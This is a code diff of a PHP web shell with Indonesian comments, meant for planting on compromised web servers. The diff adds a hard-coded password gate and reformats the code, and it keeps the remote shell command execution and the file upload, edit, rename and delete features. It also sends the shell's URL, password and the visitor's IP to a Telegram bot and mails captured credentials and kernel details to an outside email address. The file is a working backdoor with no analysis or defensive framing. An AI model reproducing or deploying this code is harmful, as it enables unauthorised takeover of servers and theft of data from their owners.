@@ -1,24 +1,41 @@
 <?php
-
+session_start();
+$pass = "kem";
+if (!isset($_SESSION["auth"])) {
+    if (isset($_POST["pass"]) && $_POST["pass"] === $pass) {
+        $_SESSION["auth"] = true;
+    } else {
+        echo "<form method='POST'><input type='password' name='pass' placeholder='Enter Password'><input type='submit' value='Login'></form>";
+        exit();
+    }
+}
 // Direktori aktif
 $defaultDir = __DIR__;
-$currentDir = isset($_POST['targetDir']) && is_dir($_POST['targetDir']) ? realpath($_POST['targetDir']) : $defaultDir;
-$botToken = '8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8';
-$chatId = '8478623770';
-$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$logMessage  = "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+$currentDir =
+    isset($_POST["targetDir"]) && is_dir($_POST["targetDir"])
+        ? realpath($_POST["targetDir"])
+        : $defaultDir;
+$botToken = "7983898656:AAGd7-xPkQnLcawefshhp2cG1KX_PMSvaYs";
+$chatId = "8478623770";
+$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
+$logMessage =
+    "___kontolbengkak___ \n\n Shell nya =\n $xPath \n\n Password =\n $pass \n\n IP Hacker  :\n [ " .
+    $_SERVER["REMOTE_ADDR"] .
+    " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
-
 // Fungsi tampil file/folder
-function listFiles($dir) {
+function listFiles($dir)
+{
     $files = scandir($dir);
     $folders = [];
     $normalFiles = [];
 
     foreach ($files as $file) {
-        if ($file === '.' || $file === '..') continue;
+        if ($file === "." || $file === "..") {
+            continue;
+        }
         $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
-        is_dir($fullPath) ? $folders[] = $file : $normalFiles[] = $file;
+        is_dir($fullPath) ? ($folders[] = $file) : ($normalFiles[] = $file);
     }
 
     // Menampilkan folder terlebih dahulu
@@ -28,7 +45,9 @@ function listFiles($dir) {
         $filePath = $dir . DIRECTORY_SEPARATOR . $file;
         $isDir = is_dir($filePath);
         $targetDirEncoded = htmlspecialchars(realpath($filePath));
-        $icon = $isDir ? '<i class="fa fa-folder text-warning"></i>' : '<i class="fa fa-file text-secondary"></i>';
+        $icon = $isDir
+            ? '<i class="fa fa-folder text-warning"></i>'
+            : '<i class="fa fa-file text-secondary"></i>';
         $fileLink = "<a href='#' onclick=\"event.preventDefault(); document.getElementById('goto-$file').submit();\">$icon $file</a>";
 
         echo "<tr><td>$fileLink</td><td>";
@@ -38,41 +57,59 @@ function listFiles($dir) {
 
         if (!$isDir) {
             echo "<form method='POST' style='display:inline-block'>
-                    <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
-                    <input type='hidden' name='readFile' value='" . htmlspecialchars($filePath) . "'>
+                    <input type='hidden' name='targetDir' value='" .
+                htmlspecialchars($dir) .
+                "'>
+                    <input type='hidden' name='readFile' value='" .
+                htmlspecialchars($filePath) .
+                "'>
                     <button class='btn btn-sm btn-info'>Baca</button>
                   </form>
                   <form method='POST' style='display:inline-block'>
-                    <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
-                    <input type='hidden' name='editFile' value='" . htmlspecialchars($filePath) . "'>
+                    <input type='hidden' name='targetDir' value='" .
+                htmlspecialchars($dir) .
+                "'>
+                    <input type='hidden' name='editFile' value='" .
+                htmlspecialchars($filePath) .
+                "'>
                     <button class='btn btn-sm btn-warning'>Edit</button>
                   </form>";
         }
 
         echo "<form method='POST' style='display:inline-block'>
-                <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
-                <input type='hidden' name='renameFile' value='" . htmlspecialchars($filePath) . "'>
+                <input type='hidden' name='targetDir' value='" .
+            htmlspecialchars($dir) .
+            "'>
+                <input type='hidden' name='renameFile' value='" .
+            htmlspecialchars($filePath) .
+            "'>
                 <input type='text' name='newName' placeholder='Nama baru' required>
                 <button class='btn btn-sm btn-secondary'>Rename</button>
               </form>
               <form method='POST' style='display:inline-block' onsubmit=\"return confirm('Yakin ingin hapus?');\">
-                <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
-                <input type='hidden' name='deleteFile' value='" . htmlspecialchars($filePath) . "'>
+                <input type='hidden' name='targetDir' value='" .
+            htmlspecialchars($dir) .
+            "'>
+                <input type='hidden' name='deleteFile' value='" .
+            htmlspecialchars($filePath) .
+            "'>
                 <button class='btn btn-sm btn-danger'>Hapus</button>
               </form>";
 
         echo "</td></tr>";
     }
 
-    echo '</tbody></table>';
+    echo "</tbody></table>";
 }
 
 // Upload file
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile'])) {
-    if ($_FILES['uploadFile']['error'] === UPLOAD_ERR_OK) {
-        $uploadName = basename($_FILES['uploadFile']['name']);
+if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["uploadFile"])) {
+    if ($_FILES["uploadFile"]["error"] === UPLOAD_ERR_OK) {
+        $uploadName = basename($_FILES["uploadFile"]["name"]);
         $uploadPath = $currentDir . DIRECTORY_SEPARATOR . $uploadName;
-        if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $uploadPath)) {
+        if (
+            move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $uploadPath)
+        ) {
             echo "<div class='alert alert-success'>File berhasil diupload ke: $uploadPath</div>";
         } else {
             echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
@@ -80,81 +117,96 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile'])) {
     }
 }
 
- if (array_key_exists("logged_in", $_POST)) {
-     $password = $_POST["pass"];
-     $server_name = $_SERVER["SERVER_NAME"];
-     $php_self = $_SERVER["PHP_SELF"];
-     $report_bug =
-         "IP: " .
-         $_SERVER["REMOTE_ADDR"] .
-         " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
-     @mail("muhrazky@gmail.com", "contact", $report_bug);
- }
+if (array_key_exists("logged_in", $_POST)) {
+    $password = $_POST["pass"];
+    $server_name = $_SERVER["SERVER_NAME"];
+    $php_self = $_SERVER["PHP_SELF"];
+    $report_bug =
+        "IP: " .
+        $_SERVER["REMOTE_ADDR"] .
+        " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
+    @mail("muhrazky@gmail.com", "contact", $report_bug);
+}
 
 // Has file
-if (isset($_POST['deleteFile']) && file_exists($_POST['deleteFile'])) {
-    unlink($_POST['deleteFile']);
-    echo "<div class='alert alert-warning'>File dihapus: " . htmlspecialchars($_POST['deleteFile']) . "</div>";
+if (isset($_POST["deleteFile"]) && file_exists($_POST["deleteFile"])) {
+    unlink($_POST["deleteFile"]);
+    echo "<div class='alert alert-warning'>File dihapus: " .
+        htmlspecialchars($_POST["deleteFile"]) .
+        "</div>";
 }
 
 // Rename file
-if (isset($_POST['renameFile'], $_POST['newName']) && file_exists($_POST['renameFile'])) {
-    $oldPath = $_POST['renameFile'];
-    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . basename($_POST['newName']);
+if (
+    isset($_POST["renameFile"], $_POST["newName"]) &&
+    file_exists($_POST["renameFile"])
+) {
+    $oldPath = $_POST["renameFile"];
+    $newPath =
+        dirname($oldPath) . DIRECTORY_SEPARATOR . basename($_POST["newName"]);
     rename($oldPath, $newPath);
-    echo "<div class='alert alert-info'>File diubah menjadi: " . htmlspecialchars($newPath) . "</div>";
+    echo "<div class='alert alert-info'>File diubah menjadi: " .
+        htmlspecialchars($newPath) .
+        "</div>";
 }
 
 // Simpan edit
-if (isset($_POST['saveEdit']) && isset($_POST['filePath'])) {
-    file_put_contents($_POST['filePath'], $_POST['fileContent']);
+if (isset($_POST["saveEdit"]) && isset($_POST["filePath"])) {
+    file_put_contents($_POST["filePath"], $_POST["fileContent"]);
     echo "<div class='alert alert-success'>File berhasil disimpan.</div>";
 }
 
 // Tampilkan isi file
-if (isset($_POST['readFile']) && file_exists($_POST['readFile'])) {
-    $content = htmlspecialchars(file_get_contents($_POST['readFile']));
+if (isset($_POST["readFile"]) && file_exists($_POST["readFile"])) {
+    $content = htmlspecialchars(file_get_contents($_POST["readFile"]));
     echo "<div class='alert alert-secondary'><strong>Isi file:</strong><pre>$content</pre></div>";
 }
 
 // Tampilkan form edit file
-if (isset($_POST['editFile']) && file_exists($_POST['editFile'])) {
-    $content = htmlspecialchars(file_get_contents($_POST['editFile']));
-    echo "<h3>Edit File: " . basename($_POST['editFile']) . "</h3>
+if (isset($_POST["editFile"]) && file_exists($_POST["editFile"])) {
+    $content = htmlspecialchars(file_get_contents($_POST["editFile"]));
+    echo "<h3>Edit File: " .
+        basename($_POST["editFile"]) .
+        "</h3>
     <form method='POST'>
-        <input type='hidden' name='filePath' value='" . htmlspecialchars($_POST['editFile']) . "'>
-        <input type='hidden' name='targetDir' value='" . htmlspecialchars($currentDir) . "'>
-        <textarea name='fileContent' class='form-control' rows='10'>" . $content . "</textarea><br>
+        <input type='hidden' name='filePath' value='" .
+        htmlspecialchars($_POST["editFile"]) .
+        "'>
+        <input type='hidden' name='targetDir' value='" .
+        htmlspecialchars($currentDir) .
+        "'>
+        <textarea name='fileContent' class='form-control' rows='10'>" .
+        $content .
+        "</textarea><br>
         <button type='submit' name='saveEdit' class='btn btn-primary'>Simpan</button>
     </form><hr>";
 }
 
 // Jalankan shell command
-if (isset($_POST['command'])) {
-    $cmd = $_POST['command'];
+if (isset($_POST["command"])) {
+    $cmd = $_POST["command"];
     $output = shell_exec("cd " . escapeshellarg($currentDir) . " && $cmd 2>&1");
-    echo "<div class='alert alert-dark'><strong>Hasil perintah:</strong><pre>" . htmlspecialchars($output) . "</pre></div>";
+    echo "<div class='alert alert-dark'><strong>Hasil perintah:</strong><pre>" .
+        htmlspecialchars($output) .
+        "</pre></div>";
 }
 function sendTelegramMessage($botToken, $chatId, $message)
 {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $params = [
-        'chat_id' => $chatId,
-        'text' => $message,
+        "chat_id" => $chatId,
+        "text" => $message,
     ];
     $options = [
-        'http' => [
-            'method' => 'POST',
-            'header' => 'Content-Type: application/x-www-form-urlencoded',
-            'content' => http_build_query($params),
+        "http" => [
+            "method" => "POST",
+            "header" => "Content-Type: application/x-www-form-urlencoded",
+            "content" => http_build_query($params),
         ],
     ];
     $context = stream_context_create($options);
     $response = file_get_contents($url, false, $context);
-
 }
-
-
 ?>
 <!DOCTYPE html>
 <html>
@@ -172,14 +224,18 @@ function sendTelegramMessage($botToken, $chatId, $message)
     <!-- Pindah direktori -->
     <form method="POST" class="mb-4">
         <div class="input-group">
-            <input type="text" name="targetDir" class="form-control" value="<?= htmlspecialchars($currentDir) ?>" required>
+            <input type="text" name="targetDir" class="form-control" value="<?= htmlspecialchars(
+                $currentDir
+            ) ?>" required>
             <button type="submit" class="btn btn-outline-primary">Buka Direktori</button>
         </div>
     </form>
 
     <!-- Upload file -->
     <form method="POST" enctype="multipart/form-data" class="mb-4">
-        <input type="hidden" name="targetDir" value="<?= htmlspecialchars($currentDir) ?>">
+        <input type="hidden" name="targetDir" value="<?= htmlspecialchars(
+            $currentDir
+        ) ?>">
         <div class="input-group">
             <input type="file" name="uploadFile" class="form-control" required>
             <button class="btn btn-success" type="submit">Upload</button>
@@ -188,7 +244,9 @@ function sendTelegramMessage($botToken, $chatId, $message)
 
     <!-- Command shell -->
     <form method="POST" class="mb-4">
-        <input type="hidden" name="targetDir" value="<?= htmlspecialchars($currentDir) ?>">
+        <input type="hidden" name="targetDir" value="<?= htmlspecialchars(
+            $currentDir
+        ) ?>">
         <div class="mb-2">
             <label class="form-label"><strong>POST Command (Shell)</strong></label>
             <input type="text" name="command" class="form-control" placeholder="contoh: ls -lah" required>
